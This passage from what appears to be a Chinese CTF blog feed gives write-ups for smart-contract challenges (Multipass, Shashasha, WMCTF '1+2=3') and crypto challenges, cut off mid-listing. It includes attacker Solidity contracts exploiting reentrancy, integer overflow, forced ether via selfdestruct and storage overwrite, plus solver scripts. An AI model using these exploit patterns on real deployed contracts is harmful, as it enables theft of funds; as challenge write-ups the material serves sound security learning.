<h1 id="0x05-MULTIPASS"><a href="#0x05-MULTIPASS" class="headerlink" title="0x05 MULTIPASS"></a>0x05 MULTIPASS</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity &#x3D; 0.4.25;</span><br><span class="line"> </span><br><span class="line">contract Multipass &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint256 public money;</span><br><span class="line">     </span><br><span class="line">    mapping(address &#x3D;&gt; int256) public contributions;</span><br><span class="line">     </span><br><span class="line">    bool public withdrawn;</span><br><span class="line">     </span><br><span class="line">    constructor() public payable &#123;</span><br><span class="line">        contributions[msg.sender] &#x3D; int256(msg.value * 900000000000000000000);</span><br><span class="line">        owner &#x3D; msg.sender;</span><br><span class="line">        money &#x3D; msg.value;</span><br><span class="line">        withdrawn &#x3D; false;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    function gift() public payable &#123;</span><br><span class="line">        require(contributions[msg.sender] &#x3D;&#x3D; 0 &amp;&amp; msg.value &#x3D;&#x3D; 0.00005 ether);</span><br><span class="line">        contributions[msg.sender] &#x3D; int256(msg.value) * 10;</span><br><span class="line">        money +&#x3D; msg.value;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    function takeSomeMoney() public &#123;</span><br><span class="line">        require(msg.sender &#x3D;&#x3D; owner &amp;&amp; withdrawn &#x3D;&#x3D; false);</span><br><span class="line">        uint256 someMoney &#x3D; money&#x2F;20;</span><br><span class="line">        if(msg.sender.call.value(someMoney)())&#123;</span><br><span class="line">            money -&#x3D; someMoney;</span><br><span class="line">        &#125;</span><br><span class="line">        withdrawn &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    function contribute(int256 _factor) public &#123;</span><br><span class="line">        require(contributions[msg.sender] !&#x3D; 0 &amp;&amp; _factor &lt; 10);</span><br><span class="line">        contributions[msg.sender] *&#x3D; _factor;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    function claimContract() public &#123;</span><br><span class="line">        require(contributions[msg.sender] &gt; contributions[owner]);</span><br><span class="line">        owner &#x3D; msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Another Steal money task of course XD.</p>
<p>整数溢出</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">    Multipass x;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        x = Multipass(address contract);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">prepare</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span></span>&#123;</span><br><span class="line">        x.gift.value(<span class="number">0.00005</span> ether)();</span><br><span class="line">        x.contribute(-<span class="number">100000000000</span>);</span><br><span class="line">        x.contribute(-<span class="number">100000000000</span>);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Claim</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        x.claimContract();</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">reEntry</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        x.takeSomeMoney();</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span></span>&#123;</span><br><span class="line">        x.takeSomeMoney(); <span class="comment">//reEntry</span></span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Prepare()-&gt;Claim-&gt;reEntry</p>
<h1 id="0x06-SHASHASHA"><a href="#0x06-SHASHASHA" class="headerlink" title="0x06 SHASHASHA"></a>0x06 SHASHASHA</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity &#x3D; 0.4.25;</span><br><span class="line"> </span><br><span class="line">contract Shashasha &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint256 public money;</span><br><span class="line">     </span><br><span class="line">    mapping(address &#x3D;&gt; uint256) private contributions;    </span><br><span class="line">     </span><br><span class="line">    bool public hacker;</span><br><span class="line">    uint[] public godlike;</span><br><span class="line">     </span><br><span class="line">    constructor() public payable &#123;</span><br><span class="line">        owner &#x3D; msg.sender;</span><br><span class="line">        contributions[owner] &#x3D; msg.value * 9999999999999;</span><br><span class="line">        money +&#x3D; msg.value;</span><br><span class="line">        hacker &#x3D; false;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    function becomingHacker() public &#123;</span><br><span class="line">        require(address(this).balance !&#x3D; money);</span><br><span class="line">        contributions[msg.sender] &#x3D; 100;</span><br><span class="line">        hacker &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function remove() public&#123;</span><br><span class="line">        require(hacker);</span><br><span class="line">        godlike.length--;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    function append(uint256 _value) public&#123;</span><br><span class="line">        require(hacker);</span><br><span class="line">        godlike.push(_value);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    function update(uint256 _key, uint256 _value) public &#123;</span><br><span class="line">        require(hacker);        </span><br><span class="line">        godlike[_key] &#x3D; _value;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    function withdraw() public payable &#123;</span><br><span class="line">        require(contributions[msg.sender] &gt; contributions[owner]);</span><br><span class="line">        msg.sender.call.value(address(this).balance)();</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    function getContrib(address _key) public view returns(uint256) &#123;</span><br><span class="line">        return contributions[_key];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>The last steal money task, and really fucking hard! o(╥﹏╥)o</p>
<p>要想成为hack需要先hacker = true，也就是address(this).balance != money，但是合约的默认函数不是payable，我们就没有办法直接发送。想到了selfdestruct。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">    constructor() payable&#123;&#125;</span><br><span class="line">    function destory()&#123;</span><br><span class="line">        selfdestruct(address contract);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此时调用becomingHacker()函数就可以成功</p>
<p>在注意到 remove()可以通过多次调用实现整数减法溢出，我们就可以实现数组越界访问</p>
<p><img src="/2021/09/10/27/image-20210909124440662.png" alt="image-20210909124440662"></p>
<p>接下去就是寻找contributions映射的位置去修改owner的数值，先计算contributions[owner]对应的位置</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sha3</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">byte32</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="keyword">return</span> binascii.unhexlify(<span class="string">&#x27;%064x&#x27;</span>%i)</span><br><span class="line">key=<span class="number">0x0b896C359adF4BB1c19c7dfd41Dc35dc9216E470</span></span><br><span class="line">a=byte32(key)+byte32(<span class="number">2</span>)</span><br><span class="line">b=sha3.keccak_256(a).hexdigest()</span><br><span class="line">print(b)</span><br><span class="line"><span class="comment">#814b2098a804d4eb037abd074ad95f52b2b58dfc0d6ea8162adc21fe54e9f0b6</span></span><br></pre></td></tr></table></figure>
<p><img src="/2021/09/10/27/image-20210910211904766.png" alt="image-20210910211904766"></p>
<p>再计算godlike[attack]对应的位置</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sha3</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">byte32</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="keyword">return</span> binascii.unhexlify(<span class="string">&#x27;%064x&#x27;</span>%i)</span><br><span class="line">b=sha3.keccak_256(byte32(<span class="number">4</span>)).hexdigest()</span><br><span class="line"><span class="comment">#8a35acfbc15ff81a39ae7d344fd709f28e8600b4aa8c65c6b64bfe7fe36bd19b</span></span><br></pre></td></tr></table></figure>
<p>根据公示计算偏移的位置</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(<span class="built_in">hex</span>(<span class="number">2</span>**<span class="number">256</span>-<span class="number">0x8a35acfbc15ff81a39ae7d344fd709f28e8600b4aa8c65c6b64bfe7fe36bd19b</span>+<span class="number">0x814b2098a804d4eb037abd074ad95f52b2b58dfc0d6ea8162adc21fe54e9f0b6</span>))</span><br><span class="line"><span class="comment">#0xf715739ce6a4dcd0c9cc3fd2fb025560242f8d4762e2424f7490237e717e1f1b</span></span><br></pre></td></tr></table></figure>
<p><img src="/2021/09/10/27/image-20210910213845520.png" alt="image-20210910213845520"></p>
<p><img src="/2021/09/10/27/image-20210910213858460.png" alt="image-20210910213858460"></p>
<p>此时我们就可以实现contributions[msg.sender] &gt; contributions[owner]，从而调用withdraw函数，达到题目要我们实现的目的。</p>
]]></content>
      <categories>
        <category>区块链安全</category>
      </categories>
      <tags>
        <tag>区块链安全</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2021WMCTF 1+2=3 复现</title>
    <url>/2021/09/08/26/</url>
    <content><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p> 复现2021WMCTF 一道blockchain赛题—1+2=3</p>
<h1 id="0x02-题目分析"><a href="#0x02-题目分析" class="headerlink" title="0x02 题目分析"></a>0x02 题目分析</h1><p>基于chainflag的框架，通过选项拿到题目源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity 0.8.0;</span><br><span class="line"></span><br><span class="line">contract Dumper &#123;</span><br><span class="line">    constructor(bytes memory code) &#123;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            return(add(code, 0x20), mload(code))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface Storage &#123;</span><br><span class="line">    function getNumber() external view returns (uint256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Puzzle &#123;</span><br><span class="line">    Storage public Storage1;</span><br><span class="line">    Storage public Storage2;</span><br><span class="line">    Storage public Storage3;</span><br><span class="line"></span><br><span class="line">    bool public solved;</span><br><span class="line"></span><br><span class="line">    function check(bytes memory code) private returns (bool) &#123;</span><br><span class="line">        uint256 i &#x3D; 0;</span><br><span class="line">        while (i &lt; code.length) &#123;</span><br><span class="line">            uint8 op &#x3D; uint8(code[i]);</span><br><span class="line">            if (</span><br><span class="line">                op &#x3D;&#x3D; 0x3B || &#x2F;&#x2F; EXTCODECOPY</span><br><span class="line">                op &#x3D;&#x3D; 0x3C || &#x2F;&#x2F; EXTCODESIZE</span><br><span class="line">                op &#x3D;&#x3D; 0x3F || &#x2F;&#x2F; EXTCODEHASH</span><br><span class="line">                op &#x3D;&#x3D; 0x54 || &#x2F;&#x2F; SLOAD</span><br><span class="line">                op &#x3D;&#x3D; 0x55 || &#x2F;&#x2F; SSTORE</span><br><span class="line">                op &#x3D;&#x3D; 0xF0 || &#x2F;&#x2F; CREATE</span><br><span class="line">                op &#x3D;&#x3D; 0xF1 || &#x2F;&#x2F; CALL</span><br><span class="line">                op &#x3D;&#x3D; 0xF2 || &#x2F;&#x2F; CALLCODE</span><br><span class="line">                op &#x3D;&#x3D; 0xF4 || &#x2F;&#x2F; DELEGATECALL</span><br><span class="line">                op &#x3D;&#x3D; 0xF5 || &#x2F;&#x2F; CREATE2</span><br><span class="line">                op &#x3D;&#x3D; 0xFA || &#x2F;&#x2F; STATICCALL</span><br><span class="line">                op &#x3D;&#x3D; 0xFF &#x2F;&#x2F; SELFDESTRUCT</span><br><span class="line">            ) return false;</span><br><span class="line"></span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function reverse(bytes memory a) private returns (bytes memory) &#123;</span><br><span class="line">        bytes memory b &#x3D; new bytes(a.length);</span><br><span class="line">        for (uint256 i &#x3D; 0; i &lt; a.length; i++) &#123;</span><br><span class="line">            b[b.length - i - 1] &#x3D; a[i];</span><br><span class="line">        &#125;</span><br><span class="line">        return b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sum(bytes memory a, bytes memory b) private returns (bytes memory) &#123;</span><br><span class="line">        bytes memory c &#x3D; new bytes(a.length);</span><br><span class="line">        for (uint256 i &#x3D; 0; i &lt; a.length; i++) &#123;</span><br><span class="line">            uint8 q &#x3D; uint8(a[i]) + uint8(b[i]);</span><br><span class="line">            c[i] &#x3D; bytes1(q);</span><br><span class="line">        &#125;</span><br><span class="line">        return c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deploy(bytes memory code) private returns (Storage) &#123;</span><br><span class="line">        require(code.length &lt;&#x3D; 100);</span><br><span class="line">        require(check(code));</span><br><span class="line"></span><br><span class="line">        return Storage(address(new Dumper(code)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function giveMeFlag(bytes memory code) public &#123;</span><br><span class="line">        Storage1 &#x3D; deploy(code);</span><br><span class="line">        require(Storage1.getNumber() &#x3D;&#x3D; 1);</span><br><span class="line">        Storage2 &#x3D; deploy(reverse(code));</span><br><span class="line">        require(Storage2.getNumber() &#x3D;&#x3D; 2);</span><br><span class="line">        Storage3 &#x3D; deploy(sum(code, reverse(code)));</span><br><span class="line">        require(Storage3.getNumber() &#x3D;&#x3D; 3);</span><br><span class="line"></span><br><span class="line">        solved &#x3D; true; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() public view returns(bool) &#123;</span><br><span class="line">        return solved;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分析giveMeFlag函数，需要满足三个require条件，进一步分析deploy函数，需要满足传入的code.length小于100，同时需要check验证：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x3B -&gt; EXTCODECOPY</span><br><span class="line">0x3C -&gt; EXTCODESIZE</span><br><span class="line">0x3F -&gt; EXTCODEHASH</span><br><span class="line">0x54 -&gt; SLOAD</span><br><span class="line">0x55 -&gt; SSTORE</span><br><span class="line">0xF0 -&gt; CREATE</span><br><span class="line">0xF1 -&gt; CALL</span><br><span class="line">0xF2 -&gt; CALLCODE</span><br><span class="line">0xF4 -&gt; DELEGATECALL</span><br><span class="line">0xF5 -&gt; CREATE2</span><br><span class="line">0xFA -&gt; STATICCALL</span><br><span class="line">0xFF -&gt; SELFDESTRUCT</span><br></pre></td></tr></table></figure>
<h1 id="0x03-POC构造"><a href="#0x03-POC构造" class="headerlink" title="0x03 POC构造"></a>0x03 POC构造</h1><p>先看第一个require，要求Storage1.getNumber() == 1，我们可以看到interface Storage合约中没有完整实现getNumber() 函数，也就是说我们的字节码执行之后需要返回1。参考<a href="https://ethernaut.openzeppelin.com/">Ethernaut</a>MagicNumber挑战，构造出字节码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">600160005260206000f3</span><br></pre></td></tr></table></figure>
<p>此时对应的反汇编</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract Contract &#123;</span><br><span class="line">    function main() &#123;</span><br><span class="line">        memory[0x00:0x20] &#x3D; 0x01;</span><br><span class="line">        return memory[0x00:0x20];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在看第二个require，要求Storage1.getNumber() == 2。但是在此之前传入的code需要进行reverse，分析函数发现，其实现的是对code反转。那我们先构造出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">600160005260206000f3</span><br><span class="line">#按照字节反转</span><br><span class="line">f3006020605200600260</span><br><span class="line">#总字节码</span><br><span class="line">600160005260206000f3f3006020605200600260</span><br><span class="line">#reverse</span><br><span class="line">600260005260206000f3f3006020605200600160</span><br></pre></td></tr></table></figure>
<p>继续看第三个require，要求Storage1.getNumber() == 3。但是在此之前会执行将正序和逆序的字节码相加的字节码。按照我们之前的构造的显然无法满足。我们肯定是需要执行这一段字节码的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">600360005260206000f3</span><br></pre></td></tr></table></figure>
<p>也就是说对于上面的字节码我们需要填充一部分00来保证这一段字节码不被干扰，大体就是A+0+C+B，反转之后就是B+C+0+A，相加之后是D+C+C+D(D=A+B)，现在的思路应该是如何在D+C+C+D这里面执行C，而不被D所干扰。我们根据52指令的解释</p>
<p><img src="/2021/09/08/26/image-20210908151021428.png" alt="image-20210908151021428"></p>
<p>其取的是栈顶的两个元素，如果我们将D先放入栈中，那就不会对我们的C执行造成干扰。去找PUSHx指令，根据D的长度，至少要选择PUSH10。接下去就是怎么在首尾出PUSH指令。这两个指令在require1和require2时会被首先执行，那些依赖于栈顶元素执行的指令不能选择，否则会失败。结果排查发现只能选择0x30左右的指令。此时我们先选择构造PUSH10，得到字节码如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">33600160005260206000f300000000000000000000f3006020605200600360f300602060520060026036</span><br><span class="line">#reverse</span><br><span class="line">36600260005260206000f3600360005260206000f300000000000000000000f300602060520060016033</span><br></pre></td></tr></table></figure>
<p>我们可以很明显的看到在执行相加的时候，有两处f3相加，但是由于solidity 0.8.0 之后有算术溢出检测，如此会导致revert，所以我们需要错开两个f3，这就需要扩展A，B，多加一个字节。那我们就需要构造PUSH11。要保证不溢出，能选择的字节码空间很小。同时于是我选择在第一个f3之后加一个03，同时需要重新PUSH1 00，得到新的字节码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">32600160005260206000f3006000600360005260206000f300000000000000000000f300600320600060520060026038</span><br><span class="line">#revert</span><br><span class="line">38600260005260006020036000f300000000000000000000f3006020605200600360006000f300602060520060016032</span><br><span class="line">#sum</span><br><span class="line">6ac003c000a4c020c020f66060f3600360005260206000f3f3006020605200600360f36060f620c020c0a400c003c06a</span><br></pre></td></tr></table></figure>
<p><img src="/2021/09/08/26/image-20210908162600147.png" alt="image-20210908162600147"></p>
<h1 id="0x04-思考"><a href="#0x04-思考" class="headerlink" title="0x04 思考"></a>0x04 思考</h1><p>poc可以修改的地方：</p>
<ul>
<li><p>首尾字节码</p>
</li>
<li><p>填充的03(sub)，也可以用其他的运算符，只要最后在栈顶的是00，20就可以用f3返回</p>
</li>
<li><p>开辟空间的位置也可以选择</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">600160205260206020f3</span><br><span class="line">contract Contract &#123;</span><br><span class="line">    function main() &#123;</span><br><span class="line">        memory[0x20:0x40] &#x3D; 0x01;</span><br><span class="line">        return memory[0x20:0x40];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>简单的收获：</p>
<p>更加熟悉了以太坊虚拟机的字节码，相信对后面的智能合约逆向会有所帮助 </p>
]]></content>
      <categories>
        <category>区块链安全</category>
      </categories>
      <tags>
        <tag>区块链安全</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>羊城杯2021 Crypto Writeup</title>
    <url>/2021/09/12/28/</url>
    <content><![CDATA[<h1 id="RingRingRing"><a href="#RingRingRing" class="headerlink" title="RingRingRing"></a>RingRingRing</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hash_get</span>(<span class="params">data,aim</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">0xfffffff</span>):</span><br><span class="line">        stra=<span class="built_in">str</span>(i)+data  </span><br><span class="line">        hasha=md5(stra.encode()).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> hasha[<span class="number">0</span>:<span class="number">5</span>] == aim:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_abcdf</span>(<span class="params">attack</span>):</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">102</span>):</span><br><span class="line">        e=<span class="number">2</span>*a**<span class="number">2</span></span><br><span class="line">        attack.recv()</span><br><span class="line">        attack.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(a),<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        attack.recv()</span><br><span class="line">        attack.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(a),<span class="string">&#x27;utf-8&#x27;</span>))   </span><br><span class="line">        attack.recv()</span><br><span class="line">        attack.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(a),<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        attack.recv()</span><br><span class="line">        attack.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(a),<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        attack.recv()</span><br><span class="line">        attack.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(e),<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        attack.recv()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">attack=remote(<span class="string">&quot;192.168.41.2&quot;</span>,<span class="number">2378</span>)</span><br><span class="line">data=<span class="built_in">str</span>(attack.recvuntil(<span class="string">&quot;)[0:5]&quot;</span>)[-<span class="number">10</span>:-<span class="number">6</span>],<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">aim=<span class="built_in">str</span>(attack.recvuntil(<span class="string">&quot;\n&quot;</span>)[-<span class="number">6</span>:-<span class="number">1</span>],<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">attack.recv()</span><br><span class="line">has=<span class="built_in">bytes</span>(<span class="built_in">str</span>(hash_get(data,aim)),<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">attack.sendline(has)</span><br><span class="line">attack.recv()</span><br><span class="line">find_abcdf(attack)</span><br></pre></td></tr></table></figure>
<h1 id="Bigrsa"><a href="#Bigrsa" class="headerlink" title="Bigrsa"></a>Bigrsa</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c=<span class="number">60406168302768860804211220055708551816238816061772464557956985699400782163597251861675967909246187833328847989530950308053492202064477410641014045601986036822451416365957817685047102703301347664879870026582087365822433436251615243854347490600004857861059245403674349457345319269266645006969222744554974358264</span></span><br><span class="line">n1 = <span class="number">103835296409081751860770535514746586815395898427260334325680313648369132661057840680823295512236948953370895568419721331170834557812541468309298819497267746892814583806423027167382825479157951365823085639078738847647634406841331307035593810712914545347201619004253602692127370265833092082543067153606828049061</span></span><br><span class="line">n2 = <span class="number">115383198584677147487556014336448310721853841168758012445634182814180314480501828927160071015197089456042472185850893847370481817325868824076245290735749717384769661698895000176441497242371873981353689607711146852891551491168528799814311992471449640014501858763495472267168224015665906627382490565507927272073</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p=<span class="number">10210039189276167395636779557271057346691950991057423589319031237857569595284598319093522326723650646963251941930167018746859556383067696079622198265424441</span></span><br><span class="line">q1=<span class="number">10169921435575123642561867469669552661717864247752251361375671837367086221354750692635829007786009042729357644276462913457660789233674358081650339142863821</span></span><br><span class="line">q2=<span class="number">11300955505231233842374743324817494386700809291852528704864397779486924493760947925710590633254027339824598181322986060728301639209174112581120081509548753</span></span><br><span class="line"></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q2-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=gmpy2.powmod(c,d,n2)</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q1-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=gmpy2.powmod(m,d,n1)</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<h1 id="MISS"><a href="#MISS" class="headerlink" title="MISS"></a>MISS</h1><p>原题。。。</p>
<p><a href="https://github.com/Mathsyo/CTFs/tree/2630cdb64799774020d32107ff0ebcf269c64535/MidnightFlagCTF/Cryptography/Something_missing">https://github.com/Mathsyo/CTFs/tree/2630cdb64799774020d32107ff0ebcf269c64535/MidnightFlagCTF/Cryptography/Something_missing</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">S_BOX = [</span><br><span class="line">    <span class="number">0x63</span>, <span class="number">0x7c</span>, <span class="number">0x77</span>, <span class="number">0x7b</span>, <span class="number">0xf2</span>, <span class="number">0x6b</span>, <span class="number">0x6f</span>, <span class="number">0xc5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x2b</span>, <span class="number">0xfe</span>, <span class="number">0xd7</span>, <span class="number">0xab</span>, <span class="number">0x76</span>,</span><br><span class="line">    <span class="number">0xca</span>, <span class="number">0x82</span>, <span class="number">0xc9</span>, <span class="number">0x7d</span>, <span class="number">0xfa</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xf0</span>, <span class="number">0xad</span>, <span class="number">0xd4</span>, <span class="number">0xa2</span>, <span class="number">0xaf</span>, <span class="number">0x9c</span>, <span class="number">0xa4</span>, <span class="number">0x72</span>, <span class="number">0xc0</span>,</span><br><span class="line">    <span class="number">0xb7</span>, <span class="number">0xfd</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3f</span>, <span class="number">0xf7</span>, <span class="number">0xcc</span>, <span class="number">0x34</span>, <span class="number">0xa5</span>, <span class="number">0xe5</span>, <span class="number">0xf1</span>, <span class="number">0x71</span>, <span class="number">0xd8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>,</span><br><span class="line">    <span class="number">0x04</span>, <span class="number">0xc7</span>, <span class="number">0x23</span>, <span class="number">0xc3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9a</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xe2</span>, <span class="number">0xeb</span>, <span class="number">0x27</span>, <span class="number">0xb2</span>, <span class="number">0x75</span>,</span><br><span class="line">    <span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2c</span>, <span class="number">0x1a</span>, <span class="number">0x1b</span>, <span class="number">0x6e</span>, <span class="number">0x5a</span>, <span class="number">0xa0</span>, <span class="number">0x52</span>, <span class="number">0x3b</span>, <span class="number">0xd6</span>, <span class="number">0xb3</span>, <span class="number">0x29</span>, <span class="number">0xe3</span>, <span class="number">0x2f</span>, <span class="number">0x84</span>,</span><br><span class="line">    <span class="number">0x53</span>, <span class="number">0xd1</span>, <span class="number">0x00</span>, <span class="number">0xed</span>, <span class="number">0x20</span>, <span class="number">0xfc</span>, <span class="number">0xb1</span>, <span class="number">0x5b</span>, <span class="number">0x6a</span>, <span class="number">0xcb</span>, <span class="number">0xbe</span>, <span class="number">0x39</span>, <span class="number">0x4a</span>, <span class="number">0x4c</span>, <span class="number">0x58</span>, <span class="number">0xcf</span>,</span><br><span class="line">    <span class="number">0xd0</span>, <span class="number">0xef</span>, <span class="number">0xaa</span>, <span class="number">0xfb</span>, <span class="number">0x43</span>, <span class="number">0x4d</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0xf9</span>, <span class="number">0x02</span>, <span class="number">0x7f</span>, <span class="number">0x50</span>, <span class="number">0x3c</span>, <span class="number">0x9f</span>, <span class="number">0xa8</span>,</span><br><span class="line">    <span class="number">0x51</span>, <span class="number">0xa3</span>, <span class="number">0x40</span>, <span class="number">0x8f</span>, <span class="number">0x92</span>, <span class="number">0x9d</span>, <span class="number">0x38</span>, <span class="number">0xf5</span>, <span class="number">0xbc</span>, <span class="number">0xb6</span>, <span class="number">0xda</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xff</span>, <span class="number">0xf3</span>, <span class="number">0xd2</span>,</span><br><span class="line">    <span class="number">0xcd</span>, <span class="number">0x0c</span>, <span class="number">0x13</span>, <span class="number">0xec</span>, <span class="number">0x5f</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>, <span class="number">0xc4</span>, <span class="number">0xa7</span>, <span class="number">0x7e</span>, <span class="number">0x3d</span>, <span class="number">0x64</span>, <span class="number">0x5d</span>, <span class="number">0x19</span>, <span class="number">0x73</span>,</span><br><span class="line">    <span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4f</span>, <span class="number">0xdc</span>, <span class="number">0x22</span>, <span class="number">0x2a</span>, <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xee</span>, <span class="number">0xb8</span>, <span class="number">0x14</span>, <span class="number">0xde</span>, <span class="number">0x5e</span>, <span 